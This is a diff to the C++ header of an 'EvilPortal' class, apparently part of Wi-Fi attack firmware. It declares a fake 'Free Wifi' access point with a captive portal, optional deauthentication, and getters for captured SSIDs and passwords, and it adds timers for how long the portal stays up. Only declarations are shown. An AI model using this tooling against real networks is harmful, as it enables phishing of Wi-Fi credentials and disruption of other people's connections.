@@ -19,7 +19,6 @@ class EvilPortal {
     };
 
 public:
-    // Constructor with background mode support
     EvilPortal(
         String tssid = "", uint8_t channel = 6, bool deauth = false, bool verifyPwd = false,
         bool autoMode = false, bool backgroundMode = false
@@ -29,20 +28,26 @@ public:
     bool setup(void);
     void beginAP(void);
     void setupRoutes(void);
-    void loop(void);            // Full UI loop (foreground mode)
-    void processRequests(void); // Lightweight heartbeat (background mode)
+    void loop(void);
+    void processRequests(void);
 
-    // Karma Integration Methods
     bool hasCredentials();
     String getCapturedSSID();
     String getCapturedPassword();
 
-    // Background mode accessors
     DNSServer &getDNSServer() { return dnsServer; }
     AsyncWebServer &getWebServer() { return webServer; }
     String getApName() { return apName; }
     uint8_t getChannel() { return _channel; }
     bool isBackgroundMode() { return _backgroundMode; }
+
+    void setBaseDuration(uint16_t seconds);
+    void setExtendedDuration(uint16_t seconds);
+    void checkAndExtendDuration();
+    bool hasRecentActivity();
+    bool hasRecentPageView();
+    void recordPageView();
+    bool shouldTerminate();
 
 private:
     String apName = "Free Wifi";
@@ -51,9 +56,8 @@ private:
     bool isDeauthHeld = false;
     bool _verifyPwd;
     bool _autoMode;
-    bool _backgroundMode; // New flag for background operation
+    bool _backgroundMode;
     
-    // WiFi state tracking - store original mode before portal starts
     wifi_mode_t _originalWifiMode;
     bool _wifiWasConnected;
     
@@ -75,8 +79,14 @@ private:
     String capturedCredentialsHtml = "";
     bool verifyPass = false;
 
-    // Track handler for cleanup
     CaptiveRequestHandler *_captiveHandler = nullptr;
+
+    uint16_t _baseDurationSec = 15;
+    uint16_t _extendedDurationSec = 60;
+    unsigned long _lastActivityTime = 0;
+    bool _durationExtended = false;
+    unsigned long _launchTime = 0;
+    unsigned long _lastPageViewTime = 0;
 
     void portalController(AsyncWebServerRequest *request);
     void credsController(AsyncWebServerRequest *request);
